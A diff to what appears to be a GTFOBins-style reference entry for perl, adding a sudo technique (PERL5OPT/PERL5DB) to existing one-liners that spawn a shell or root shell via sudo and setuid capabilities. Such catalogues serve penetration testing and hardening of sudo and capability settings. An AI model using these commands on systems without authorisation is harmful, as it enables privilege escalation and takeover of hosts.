@@ -16,6 +16,8 @@ functions:
     - code: ./perl -e 'exec "/bin/sh";'
   sudo:
     - code: sudo perl -e 'exec "/bin/sh";'
+    - description: Don't forget to `CTRL+D` to exit the perl shell and get the shell.
+      code: sudo PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl
   capabilities:
     - code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ---
